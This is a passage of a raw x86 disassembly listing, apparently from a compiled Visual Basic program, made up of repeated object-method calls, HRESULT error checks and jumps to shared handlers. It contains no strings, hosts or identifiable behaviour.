  4048ec:	50                   	push   %eax
  4048ed:	57                   	push   %edi
  4048ee:	e9 ce ed ff ff       	jmp    0x4036c1
  4048f3:	8b 0e                	mov    (%esi),%ecx
  4048f5:	56                   	push   %esi
  4048f6:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  4048fc:	8d 55 d0             	lea    -0x30(%ebp),%edx
  4048ff:	50                   	push   %eax
  404900:	52                   	push   %edx
  404901:	ff d3                	call   *%ebx
  404903:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404909:	8b 06                	mov    (%esi),%eax
  40490b:	56                   	push   %esi
  40490c:	ff 90 04 03 00 00    	call   *0x304(%eax)
  404912:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  404915:	50                   	push   %eax
  404916:	51                   	push   %ecx
  404917:	ff d3                	call   *%ebx
  404919:	8b f8                	mov    %eax,%edi
  40491b:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40491e:	50                   	push   %eax
  40491f:	57                   	push   %edi
  404920:	8b 17                	mov    (%edi),%edx
  404922:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  404928:	85 c0                	test   %eax,%eax
  40492a:	db e2                	fnclex
  40492c:	7d 12                	jge    0x404940
  40492e:	68 a0 00 00 00       	push   $0xa0
  404933:	68 b8 24 40 00       	push   $0x4024b8
  404938:	57                   	push   %edi
  404939:	50                   	push   %eax
  40493a:	ff 15 28 10 40 00    	call   *0x401028
  404940:	8b 55 dc             	mov    -0x24(%ebp),%edx
  404943:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  404949:	52                   	push   %edx
  40494a:	68 78 26 40 00       	push   $0x402678
  40494f:	8b 39                	mov    (%ecx),%edi
  404951:	ff 15 20 10 40 00    	call   *0x401020
  404957:	8b d0                	mov    %eax,%edx
  404959:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40495c:	ff 15 b8 10 40 00    	call   *0x4010b8
  404962:	89 bd 5c fe ff ff    	mov    %edi,-0x1a4(%ebp)
  404968:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  40496e:	50                   	push   %eax
  40496f:	8b 85 5c fe ff ff    	mov    -0x1a4(%ebp),%eax
  404975:	57                   	push   %edi
  404976:	e9 de ed ff ff       	jmp    0x403759
  40497b:	8b 16                	mov    (%esi),%edx
  40497d:	56                   	push   %esi
  40497e:	ff 92 04 03 00 00    	call   *0x304(%edx)
  404984:	50                   	push   %eax
  404985:	8d 45 d0             	lea    -0x30(%ebp),%eax
  404988:	50                   	push   %eax
  404989:	ff d3                	call   *%ebx
  40498b:	8b 0e                	mov    (%esi),%ecx
  40498d:	56                   	push   %esi
  40498e:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404994:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  40499a:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  40499d:	50                   	push   %eax
  40499e:	52                   	push   %edx
  40499f:	ff d3                	call   *%ebx
  4049a1:	8b f8                	mov    %eax,%edi
  4049a3:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4049a6:	51                   	push   %ecx
  4049a7:	57                   	push   %edi
  4049a8:	8b 07                	mov    (%edi),%eax
  4049aa:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  4049b0:	85 c0                	test   %eax,%eax
  4049b2:	db e2                	fnclex
  4049b4:	7d 12                	jge    0x4049c8
  4049b6:	68 a0 00 00 00       	push   $0xa0
  4049bb:	68 b8 24 40 00       	push   $0x4024b8
  4049c0:	57                   	push   %edi
  4049c1:	50                   	push   %eax
  4049c2:	ff 15 28 10 40 00    	call   *0x401028
  4049c8:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4049cb:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  4049d1:	50                   	push   %eax
  4049d2:	68 88 26 40 00       	push   $0x402688
  4049d7:	8b 3a                	mov    (%edx),%edi
  4049d9:	ff 15 20 10 40 00    	call   *0x401020
  4049df:	8b d0                	mov    %eax,%edx
  4049e1:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4049e4:	ff 15 b8 10 40 00    	call   *0x4010b8
  4049ea:	8b cf                	mov    %edi,%ecx
  4049ec:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4049f2:	50                   	push   %eax
  4049f3:	57                   	push   %edi
  4049f4:	e9 7e 14 00 00       	jmp    0x405e77
  4049f9:	8b 06                	mov    (%esi),%eax
  4049fb:	56                   	push   %esi
  4049fc:	ff 90 04 03 00 00    	call   *0x304(%eax)
  404a02:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  404a05:	50                   	push   %eax
  404a06:	51                   	push   %ecx
  404a07:	ff d3                	call   *%ebx
  404a09:	8b 16                	mov    (%esi),%edx
  404a0b:	56                   	push   %esi
  404a0c:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404a12:	ff 92 04 03 00 00    	call   *0x304(%edx)
  404a18:	50                   	push   %eax
  404a19:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  404a1c:	50                   	push   %eax
  404a1d:	ff d3                	call   *%ebx
  404a1f:	8b f8                	mov    %eax,%edi
  404a21:	8d 55 dc             	lea    -0x24(%ebp),%edx
  404a24:	52                   	push   %edx
  404a25:	57                   	push   %edi
  404a26:	8b 0f                	mov    (%edi),%ecx
  404a28:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  404a2e:	85 c0                	test   %eax,%eax
  404a30:	db e2                	fnclex
  404a32:	7d 12                	jge    0x404a46
  404a34:	68 a0 00 00 00       	push   $0xa0
  404a39:	68 b8 24 40 00       	push   $0x4024b8
  404a3e:	57                   	push   %edi
  404a3f:	50                   	push   %eax
  404a40:	ff 15 28 10 40 00    	call   *0x401028
  404a46:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  404a49:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  404a4f:	51                   	push   %ecx
  404a50:	68 98 26 40 00       	push   $0x402698
  404a55:	8b 38                	mov    (%eax),%edi
  404a57:	ff 15 20 10 40 00    	call   *0x401020
  404a5d:	8b d0                	mov    %eax,%edx
  404a5f:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  404a62:	ff 15 b8 10 40 00    	call   *0x4010b8
  404a68:	8b d7                	mov    %edi,%edx
  404a6a:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  404a70:	50                   	push   %eax
  404a71:	57                   	push   %edi
  404a72:	e9 4a ec ff ff       	jmp    0x4036c1
  404a77:	8b 0e                	mov    (%esi),%ecx
  404a79:	56                   	push   %esi
  404a7a:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  404a80:	8d 55 d0             	lea    -0x30(%ebp),%edx
  404a83:	50                   	push   %eax
  404a84:	52                   	push   %edx
  404a85:	ff d3                	call   *%ebx
  404a87:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404a8d:	8b 06                	mov    (%esi),%eax
  404a8f:	56                   	push   %esi
  404a90:	ff 90 04 03 00 00    	call   *0x304(%eax)
  404a96:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  404a99:	50                   	push   %eax
  404a9a:	51                   	push   %ecx
  404a9b:	ff d3                	call   *%ebx
  404a9d:	8b f8                	mov    %eax,%edi
  404a9f:	8d 45 dc             	lea    -0x24(%ebp),%eax
  404aa2:	50                   	push   %eax
  404aa3:	57                   	push   %edi
  404aa4:	8b 17                	mov    (%edi),%edx
  404aa6:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  404aac:	85 c0                	test   %eax,%eax
  404aae:	db e2                	fnclex
  404ab0:	7d 12                	jge    0x404ac4
  404ab2:	68 a0 00 00 00       	push   $0xa0
  404ab7:	68 b8 24 40 00       	push   $0x4024b8
  404abc:	57                   	push   %edi
  404abd:	50                   	push   %eax
  404abe:	ff 15 28 10 40 00    	call   *0x401028
  404ac4:	8b 55 dc             	mov    -0x24(%ebp),%edx
  404ac7:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  404acd:	52                   	push   %edx
  404ace:	68 a8 26 40 00       	push   $0x4026a8
  404ad3:	8b 39                	mov    (%ecx),%edi
  404ad5:	ff 15 20 10 40 00    	call   *0x401020
  404adb:	8b d0                	mov    %eax,%edx
  404add:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  404ae0:	ff 15 b8 10 40 00    	call   *0x4010b8
  404ae6:	89 bd 50 fe ff ff    	mov    %edi,-0x1b0(%ebp)
  404aec:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  404af2:	50                   	push   %eax
  404af3:	8b 85 50 fe ff ff    	mov    -0x1b0(%ebp),%eax
  404af9:	57                   	push   %edi
  404afa:	e9 5a ec ff ff       	jmp    0x403759
  404aff:	8b 16                	mov    (%esi),%edx
  404b01:	56                   	push   %esi
  404b02:	ff 92 04 03 00 00    	call   *0x304(%edx)
  404b08:	50                   	push   %eax
  404b09:	8d 45 d0             	lea    -0x30(%ebp),%eax
  404b0c:	50                   	push   %eax
  404b0d:	ff d3                	call   *%ebx
  404b0f:	8b 0e                	mov    (%esi),%ecx
  404b11:	56                   	push   %esi
  404b12:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404b18:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  404b1e:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  404b21:	50                   	push   %eax
  404b22:	52                   	push   %edx
  404b23:	ff d3                	call   *%ebx
  404b25:	8b f8                	mov    %eax,%edi
  404b27:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  404b2a:	51                   	push   %ecx
  404b2b:	57                   	push   %edi
  404b2c:	8b 07                	mov    (%edi),%eax
  404b2e:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  404b34:	85 c0                	test   %eax,%eax
  404b36:	db e2                	fnclex
  404b38:	7d 12                	jge    0x404b4c
  404b3a:	68 a0 00 00 00       	push   $0xa0
  404b3f:	68 b8 24 40 00       	push   $0x4024b8
  404b44:	57                   	push   %edi
  404b45:	50                   	push   %eax
  404b46:	ff 15 28 10 40 00    	call   *0x401028
  404b4c:	8b 45 dc             	mov    -0x24(%ebp),%eax
  404b4f:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  404b55:	50                   	push   %eax
  404b56:	68 b8 26 40 00       	push   $0x4026b8
  404b5b:	8b 3a                	mov    (%edx),%edi
  404b5d:	ff 15 20 10 40 00    	call   *0x401020
  404b63:	8b d0                	mov    %eax,%edx
  404b65:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  404b68:	ff 15 b8 10 40 00    	call   *0x4010b8
  404b6e:	8b cf                	mov    %edi,%ecx
  404b70:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  404b76:	50                   	push   %eax
  404b77:	57                   	push   %edi
  404b78:	e9 fa 12 00 00       	jmp    0x405e77
  404b7d:	8b 06                	mov    (%esi),%eax
  404b7f:	56                   	push   %esi
  404b80:	ff 90 04 03 00 00    	call   *0x304(%eax)
  404b86:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  404b89:	50                   	push   %eax
  404b8a:	51                   	push   %ecx
  404b8b:	ff d3                	call   *%ebx
  404b8d:	8b 16                	mov    (%esi),%edx
  404b8f:	56                   	push   %esi
  404b90:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404b96:	ff 92 04 03 00 00    	call   *0x304(%edx)
  404b9c:	50                   	push   %eax
  404b9d:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  404ba0:	50                   	push   %eax
  404ba1:	ff d3                	call   *%ebx
  404ba3:	8b f8                	mov    %eax,%edi
  404ba5:	8d 55 dc             	lea    -0x24(%ebp),%edx
  404ba8:	52                   	push   %edx
  404ba9:	57                   	push   %edi
  404baa:	8b 0f                	mov    (%edi),%ecx
  404bac:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  404bb2:	85 c0                	test   %eax,%eax
  404bb4:	db e2                	fnclex
  404bb6:	7d 12                	jge    0x404bca
  404bb8:	68 a0 00 00 00       	push   $0xa0
  404bbd:	68 b8 24 40 00       	push   $0x4024b8
  404bc2:	57                   	push   %edi
  404bc3:	50                   	push   %eax
  404bc4:	ff 15 28 10 40 00    	call   *0x401028
  404bca:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  404bcd:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  404bd3:	51                   	push   %ecx
  404bd4:	68 c8 26 40 00       	push   $0x4026c8
  404bd9:	8b 38                	mov    (%eax),%edi
  404bdb:	ff 15 20 10 40 00    	call   *0x401020
  404be1:	8b d0                	mov    %eax,%edx
  404be3:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  404be6:	ff 15 b8 10 40 00    	call   *0x4010b8
  404bec:	8b d7                	mov    %edi,%edx
  404bee:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  404bf4:	50                   	push   %eax
  404bf5:	57                   	push   %edi
  404bf6:	e9 c6 ea ff ff       	jmp    0x4036c1
  404bfb:	8b 0e                	mov    (%esi),%ecx
  404bfd:	56                   	push   %esi
  404bfe:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  404c04:	8d 55 d0             	lea    -0x30(%ebp),%edx
  404c07:	50                   	push   %eax
  404c08:	52                   	push   %edx
  404c09:	ff d3                	call   *%ebx
  404c0b:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404c11:	8b 06                	mov    (%esi),%eax
  404c13:	56                   	push   %esi
  404c14:	ff 90 04 03 00 00    	call   *0x304(%eax)
  404c1a:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  404c1d:	50                   	push   %eax
  404c1e:	51                   	push   %ecx
  404c1f:	ff d3                	call   *%ebx
  404c21:	8b 10                	mov    (%eax),%edx
  404c23:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  404c26:	51                   	push   %ecx
  404c27:	50                   	push   %eax
  404c28:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  404c2e:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  404c34:	85 c0                	test   %eax,%eax
  404c36:	db e2                	fnclex
  404c38:	7d 18                	jge    0x404c52
  404c3a:	8b 95 48 ff ff ff    	mov    -0xb8(%ebp),%edx
  404c40:	68 a0 00 00 00       	push   $0xa0
  404c45:	68 b8 24 40 00       	push   $0x4024b8
  404c4a:	52                   	push   %edx
  404c4b:	50                   	push   %eax
  404c4c:	ff 15 28 10 40 00    	call   *0x401028
  404c52:	8b 45 dc             	mov    -0x24(%ebp),%eax
  404c55:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  404c5b:	89 45 98             	mov    %eax,-0x68(%ebp)
  404c5e:	b8 08 00 00 00       	mov    $0x8,%eax
  404c63:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  404c66:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  404c6d:	89 45 90             	mov    %eax,-0x70(%ebp)
  404c70:	c7 85 58 ff ff ff e0 	movl   $0x4026e0,-0xa8(%ebp)
  404c77:	26 40 00 
  404c7a:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  404c80:	ff 15 ac 10 40 00    	call   *0x4010ac
  404c86:	c7 85 68 ff ff ff d8 	movl   $0x4026d8,-0x98(%ebp)
  404c8d:	26 40 00 
  404c90:	e9 7a f2 ff ff       	jmp    0x403f0f
  404c95:	8b 16                	mov    (%esi),%edx
  404c97:	56                   	push   %esi
  404c98:	ff 92 04 03 00 00    	call   *0x304(%edx)
  404c9e:	50                   	push   %eax
  404c9f:	8d 45 d0             	lea    -0x30(%ebp),%eax
  404ca2:	50                   	push   %eax
  404ca3:	ff d3                	call   *%ebx
  404ca5:	8b 0e                	mov    (%esi),%ecx
  404ca7:	56                   	push   %esi
  404ca8:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404cae:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  404cb4:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  404cb7:	50                   	push   %eax
  404cb8:	52                   	push   %edx
  404cb9:	ff d3                	call   *%ebx
  404cbb:	8b 08                	mov    (%eax),%ecx
  404cbd:	8d 55 dc             	lea    -0x24(%ebp),%edx
  404cc0:	52                   	push   %edx
  404cc1:	50                   	push   %eax
  404cc2:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  404cc8:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  404cce:	85 c0                	test   %eax,%eax
  404cd0:	db e2                	fnclex
  404cd2:	7d 18                	jge    0x404cec
  404cd4:	8b 8d 48 ff ff ff    	mov    -0xb8(%ebp),%ecx
  404cda:	68 a0 00 00 00       	push   $0xa0
  404cdf:	68 b8 24 40 00       	push   $0x4024b8
  404ce4:	51                   	push   %ecx
  404ce5:	50                   	push   %eax
  404ce6:	ff 15 28 10 40 00    	call   *0x401028
  404cec:	8b 45 dc             	mov    -0x24(%ebp),%eax
  404cef:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  404cf5:	89 45 98             	mov    %eax,-0x68(%ebp)
  404cf8:	b8 08 00 00 00       	mov    $0x8,%eax
  404cfd:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  404d00:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  404d07:	89 45 90             	mov    %eax,-0x70(%ebp)
  404d0a:	c7 85 58 ff ff ff f0 	movl   $0x4026f0,-0xa8(%ebp)
  404d11:	26 40 00 
  404d14:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  404d1a:	ff 15 ac 10 40 00    	call   *0x4010ac
  404d20:	c7 85 68 ff ff ff e8 	movl   $0x4026e8,-0x98(%ebp)
  404d27:	26 40 00 
  404d2a:	e9 97 03 00 00       	jmp    0x4050c6
  404d2f:	8b 0e                	mov    (%esi),%ecx
  404d31:	56                   	push   %esi
  404d32:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  404d38:	8d 55 d0             	lea    -0x30(%ebp),%edx
  404d3b:	50                   	push   %eax
  404d3c:	52                   	push   %edx
  404d3d:	ff d3                	call   *%ebx
  404d3f:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404d45:	8b 06                	mov    (%esi),%eax
  404d47:	56                   	push   %esi
  404d48:	ff 90 04 03 00 00    	call   *0x304(%eax)
  404d4e:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  404d51:	50                   	push   %eax
  404d52:	51                   	push   %ecx
  404d53:	ff d3                	call   *%ebx
  404d55:	8b 10                	mov    (%eax),%edx
  404d57:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  404d5a:	51                   	push   %ecx
  404d5b:	50                   	push   %eax
  404d5c:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  404d62:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  404d68:	85 c0                	test   %eax,%eax
  404d6a:	db e2                	fnclex
  404d6c:	7d 18                	jge    0x404d86
  404d6e:	8b 95 48 ff ff ff    	mov    -0xb8(%ebp),%edx
  404d74:	68 a0 00 00 00       	push   $0xa0
  404d79:	68 b8 24 40 00       	push   $0x4024b8
  404d7e:	52                   	push   %edx
  404d7f:	50                   	push   %eax
  404d80:	ff 15 28 10 40 00    	call   *0x401028
  404d86:	8b 45 dc             	mov    -0x24(%ebp),%eax
  404d89:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  404d8f:	89 45 98             	mov    %eax,-0x68(%ebp)
  404d92:	b8 08 00 00 00       	mov    $0x8,%eax
  404d97:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  404d9a:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  404da1:	89 45 90             	mov    %eax,-0x70(%ebp)
  404da4:	c7 85 58 ff ff ff b4 	movl   $0x4025b4,-0xa8(%ebp)
  404dab:	25 40 00 
  404dae:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  404db4:	ff 15 ac 10 40 00    	call   *0x4010ac
  404dba:	c7 85 68 ff ff ff f8 	movl   $0x4026f8,-0x98(%ebp)
  404dc1:	26 40 00 
  404dc4:	e9 46 f1 ff ff       	jmp    0x403f0f
  404dc9:	8b 16                	mov    (%esi),%edx
  404dcb:	56                   	push   %esi
  404dcc:	ff 92 04 03 00 00    	call   *0x304(%edx)
  404dd2:	50                   	push   %eax
  404dd3:	8d 45 d0             	lea    -0x30(%ebp),%eax
  404dd6:	50                   	push   %eax
  404dd7:	ff d3                	call   *%ebx
  404dd9:	8b 0e                	mov    (%esi),%ecx
  404ddb:	56                   	push   %esi
  404ddc:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404de2:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  404de8:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  404deb:	50                   	push   %eax
  404dec:	52                   	push   %edx
  404ded:	ff d3                	call   *%ebx
  404def:	8b 08                	mov    (%eax),%ecx
  404df1:	8d 55 dc             	lea    -0x24(%ebp),%edx
  404df4:	52                   	push   %edx
  404df5:	50                   	push   %eax
  404df6:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  404dfc:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  404e02:	85 c0                	test   %eax,%eax
  404e04:	db e2                	fnclex
  404e06:	7d 18                	jge    0x404e20
  404e08:	8b 8d 48 ff ff ff    	mov    -0xb8(%ebp),%ecx
  404e0e:	68 a0 00 00 00       	push   $0xa0
  404e13:	68 b8 24 40 00       	push   $0x4024b8
  404e18:	51                   	push   %ecx
  404e19:	50                   	push   %eax
  404e1a:	ff 15 28 10 40 00    	call   *0x401028
  404e20:	8b 45 dc             	mov    -0x24(%ebp),%eax
  404e23:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  404e29:	89 45 98             	mov    %eax,-0x68(%ebp)
  404e2c:	b8 08 00 00 00       	mov    $0x8,%eax
  404e31:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  404e34:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  404e3b:	89 45 90             	mov    %eax,-0x70(%ebp)
  404e3e:	c7 85 58 ff ff ff bc 	movl   $0x4025bc,-0xa8(%ebp)
  404e45:	25 40 00 
  404e48:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  404e4e:	ff 15 ac 10 40 00    	call   *0x4010ac
  404e54:	c7 85 68 ff ff ff 00 	movl   $0x402700,-0x98(%ebp)
  404e5b:	27 40 00 
  404e5e:	e9 63 02 00 00       	jmp    0x4050c6
  404e63:	8b 0e                	mov    (%esi),%ecx
  404e65:	56                   	push   %esi
  404e66:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  404e6c:	8d 55 d0             	lea    -0x30(%ebp),%edx
  404e6f:	50                   	push   %eax
  404e70:	52                   	push   %edx
  404e71:	ff d3                	call   *%ebx
  404e73:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404e79:	8b 06                	mov    (%esi),%eax
  404e7b:	56                   	push   %esi
  404e7c:	ff 90 04 03 00 00    	call   *0x304(%eax)
  404e82:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  404e85:	50                   	push   %eax
  404e86:	51                   	push   %ecx
  404e87:	ff d3                	call   *%ebx
  404e89:	8b 10                	mov    (%eax),%edx
  404e8b:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  404e8e:	51                   	push   %ecx
  404e8f:	50                   	push   %eax
  404e90:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  404e96:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  404e9c:	85 c0                	test   %eax,%eax
  404e9e:	db e2                	fnclex
  404ea0:	7d 18                	jge    0x404eba
  404ea2:	8b 95 48 ff ff ff    	mov    -0xb8(%ebp),%edx
  404ea8:	68 a0 00 00 00       	push   $0xa0
  404ead:	68 b8 24 40 00       	push   $0x4024b8
  404eb2:	52                   	push   %edx
  404eb3:	50                   	push   %eax
  404eb4:	ff 15 28 10 40 00    	call   *0x401028
  404eba:	8b 45 dc             	mov    -0x24(%ebp),%eax
  404ebd:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  404ec3:	89 45 98             	mov    %eax,-0x68(%ebp)
  404ec6:	b8 08 00 00 00       	mov    $0x8,%eax
  404ecb:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  404ece:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  404ed5:	89 45 90             	mov    %eax,-0x70(%ebp)
  404ed8:	c7 85 58 ff ff ff 10 	movl   $0x402710,-0xa8(%ebp)
  404edf:	27 40 00 
  404ee2:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  404ee8:	ff 15 ac 10 40 00    	call   *0x4010ac
  404eee:	c7 85 68 ff ff ff 08 	movl   $0x402708,-0x98(%ebp)
  404ef5:	27 40 00 
  404ef8:	e9 12 f0 ff ff       	jmp    0x403f0f
  404efd:	8b 16                	mov    (%esi),%edx
  404eff:	56                   	push   %esi
  404f00:	ff 92 04 03 00 00    	call   *0x304(%edx)
  404f06:	50                   	push   %eax
  404f07:	8d 45 d0             	lea    -0x30(%ebp),%eax
  404f0a:	50                   	push   %eax
  404f0b:	ff d3                	call   *%ebx
  404f0d:	8b 0e                	mov    (%esi),%ecx
  404f0f:	56                   	push   %esi
  404f10:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404f16:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  404f1c:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  404f1f:	50                   	push   %eax
  404f20:	52                   	push   %edx
  404f21:	ff d3                	call   *%ebx
  404f23:	8b 08                	mov    (%eax),%ecx
  404f25:	8d 55 dc             	lea    -0x24(%ebp),%edx
  404f28:	52                   	push   %edx
  404f29:	50                   	push   %eax
  404f2a:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  404f30:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  404f36:	85 c0                	test   %eax,%eax
  404f38:	db e2                	fnclex
  404f3a:	7d 18                	jge    0x404f54
  404f3c:	8b 8d 48 ff ff ff    	mov    -0xb8(%ebp),%ecx
  404f42:	68 a0 00 00 00       	push   $0xa0
  404f47:	68 b8 24 40 00       	push   $0x4024b8
  404f4c:	51                   	push   %ecx
  404f4d:	50                   	push   %eax
  404f4e:	ff 15 28 10 40 00    	call   *0x401028
  404f54:	8b 45 dc             	mov    -0x24(%ebp),%eax
  404f57:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  404f5d:	89 45 98             	mov    %eax,-0x68(%ebp)
  404f60:	b8 08 00 00 00       	mov    $0x8,%eax
  404f65:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  404f68:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  404f6f:	89 45 90             	mov    %eax,-0x70(%ebp)
  404f72:	c7 85 58 ff ff ff ac 	movl   $0x4025ac,-0xa8(%ebp)
  404f79:	25 40 00 
  404f7c:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  404f82:	ff 15 ac 10 40 00    	call   *0x4010ac
  404f88:	c7 85 68 ff ff ff a4 	movl   $0x4025a4,-0x98(%ebp)
  404f8f:	25 40 00 
  404f92:	e9 2f 01 00 00       	jmp    0x4050c6
  404f97:	8b 0e                	mov    (%esi),%ecx
  404f99:	56                   	push   %esi
  404f9a:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  404fa0:	8d 55 d0             	lea    -0x30(%ebp),%edx
  404fa3:	50                   	push   %eax
  404fa4:	52                   	push   %edx
  404fa5:	ff d3                	call   *%ebx
  404fa7:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404fad:	8b 06                	mov    (%esi),%eax
  404faf:	56                   	push   %esi
  404fb0:	ff 90 04 03 00 00    	call   *0x304(%eax)
  404fb6:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  404fb9:	50                   	push   %eax
  404fba:	51                   	push   %ecx
  404fbb:	ff d3                	call   *%ebx
  404fbd:	8b 10                	mov    (%eax),%edx
  404fbf:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  404fc2:	51                   	push   %ecx
  404fc3:	50                   	push   %eax
  404fc4:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  404fca:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  404fd0:	85 c0                	test   %eax,%eax
  404fd2:	db e2                	fnclex
  404fd4:	7d 18                	jge    0x404fee
  404fd6:	8b 95 48 ff ff ff    	mov    -0xb8(%ebp),%edx
  404fdc:	68 a0 00 00 00       	push   $0xa0
  404fe1:	68 b8 24 40 00       	push   $0x4024b8
  404fe6:	52                   	push   %edx
  404fe7:	50                   	push   %eax
  404fe8:	ff 15 28 10 40 00    	call   *0x401028
  404fee:	8b 45 dc             	mov    -0x24(%ebp),%eax
  404ff1:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  404ff7:	89 45 98             	mov    %eax,-0x68(%ebp)
  404ffa:	b8 08 00 00 00       	mov    $0x8,%eax
  404fff:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  405002:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  405009:	89 45 90             	mov    %eax,-0x70(%ebp)
  40500c:	c7 85 58 ff ff ff 20 	movl   $0x402720,-0xa8(%ebp)
  405013:	27 40 00 
  405016:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  40501c:	ff 15 ac 10 40 00    	call   *0x4010ac
  405022:	c7 85 68 ff ff ff 18 	movl   $0x402718,-0x98(%ebp)
  405029:	27 40 00 
